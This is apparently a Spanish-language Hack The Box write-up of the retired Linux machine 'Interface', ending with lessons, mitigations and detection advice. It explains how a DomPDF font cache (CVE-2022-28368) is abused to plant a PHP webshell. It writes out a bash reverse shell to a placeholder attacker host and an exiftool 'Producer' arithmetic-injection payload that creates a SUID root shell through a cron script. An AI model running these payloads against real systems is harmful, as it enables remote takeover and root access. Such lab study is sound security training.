---
machine: Interface
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, nextjs, dompdf, cve-2022-28368, webshell, exiftool, arithmetic-injection, privesc]
---

# Interface — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un vhost de la API convierte HTML en PDF con DomPDF 1.2.0. La CVE-2022-28368 permite que una fuente remota se guarde en caché como un archivo `.php` en una ruta predecible dentro de `vendor/dompdf/.../fonts`; si la fuente contiene código PHP, al pedirla se ejecuta y da shell como `www-data`. `pspy` muestra que root ejecuta `/usr/local/sbin/cleancache.sh` cada dos minutos. El script lee el campo `Producer` de los archivos de `/tmp` con `exiftool` y lo compara mediante `[[ "$meta_producer" -eq "dompdf" ]]`; un valor con `x[$(...)]` se evalúa como expresión aritmética y ejecuta comandos como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22`: OpenSSH.
- `80`: nginx con una web Next.js y una API de renderizado.

```bash
echo '<IP> interface.htb' | sudo tee -a /etc/hosts
ffuf -u http://interface.htb -H 'Host: FUZZ.interface.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

## Enumeración

El sitio principal es una página de marketing. El vhost `prd.m.rendering-api.interface.htb` expone una API que recibe HTML y devuelve un PDF. La respuesta y los archivos del servidor confirman DomPDF 1.2.0, versión afectada por la CVE-2022-28368.

La API también permite consultar el PDF generado y guarda las fuentes en:

```text
/vendor/dompdf/dompdf/lib/fonts/<familia>_<estilo>_<md5(url)>.php
```

## Foothold

Se prepara una hoja de estilos que carga una fuente desde un servidor propio:

```css
@font-face {
  font-family: exploitfont;
  src: url('http://<LHOST>/exploit_font.php');
}
```

El archivo `exploit_font.php` contiene una webshell PHP además de datos de fuente válidos. Al renderizar el HTML, DomPDF descarga la fuente y la cachea en `fonts`. El nombre se calcula con el MD5 de la URL:

```bash
echo -n 'http://<LHOST>/exploit_font.php' | md5sum
```

La webshell queda en:

```text
/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<MD5>.php
```

```bash
curl -s --data-urlencode 'cmd=id' -o- \
  http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<MD5>.php | tail -1
```

Con `cmd=bash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"` se obtiene una shell como `www-data`.

## Movimiento lateral

La aplicación corre como `www-data` y no hay una cuenta intermedia relevante; el siguiente paso es directo a root mediante la tarea programada.

## Escalada de privilegios

`pspy` revela la ejecución periódica de:

```text
/bin/bash /usr/local/sbin/cleancache.sh
```

El script recorre `/tmp`, obtiene el `Producer` de cada archivo con `exiftool` y lo compara así:

```bash
if [[ "$meta_producer" -eq "dompdf" ]]; then
```

Bash evalúa ambos operandos como expresiones aritméticas. Se crea un archivo y se le asigna un `Producer` malicioso, usando `${IFS}` para los espacios:

```bash
touch /tmp/test
exiftool -Producer='x[$(cp${IFS}/bin/bash${IFS}/tmp/rootbash;chmod${IFS}4777${IFS}/tmp/rootbash)]' /tmp/test
```

En la siguiente pasada del cron se crea la bash SUID:

```bash
/tmp/rootbash -p
```

## Evidencia

- API de renderizado y DomPDF 1.2.0.
- Fuente remota cacheada como `.php` y webshell ejecutada.
- Shell como `www-data`.
- `cleancache.sh` ejecutado por root y comparación con `-eq`.
- Archivo con `Producer` inyectado y bash SUID creada.

## Lecciones aprendidas

- DomPDF cachea recursos remotos en rutas predecibles y ejecutables.
- Una extensión `.php` en un directorio servido convierte una fuente en webshell.
- `exiftool` devuelve metadatos controlados por el atacante.
- `[[ "$x" -eq ... ]]` evalúa aritmética, no compara cadenas.
- Los scripts de limpieza de root sobre `/tmp` son superficie de ataque.

## Mitigaciones y detección

- Actualizar DomPDF y deshabilitar recursos remotos (`isRemoteEnabled=false`).
- Guardar cachés fuera del árbol web y con extensiones no ejecutables.
- Comparar cadenas con `=` y validar los metadatos antes de usarlos.
- Evitar que scripts de root procesen archivos de usuarios sin privilegios.
- Monitorizar creación de archivos SUID y ejecuciones de `cleancache.sh`.
- Alertar de peticiones a fuentes externas desde el renderizador.

## Referencias

- [0xdf — Interface](https://0xdf.gitlab.io/2023/05/13/htb-interface.html)
- [Hack The Box — Interface](https://app.hackthebox.com/machines/interface)
- [NVD — CVE-2022-28368](https://nvd.nist.gov/vuln/detail/CVE-2022-28368)
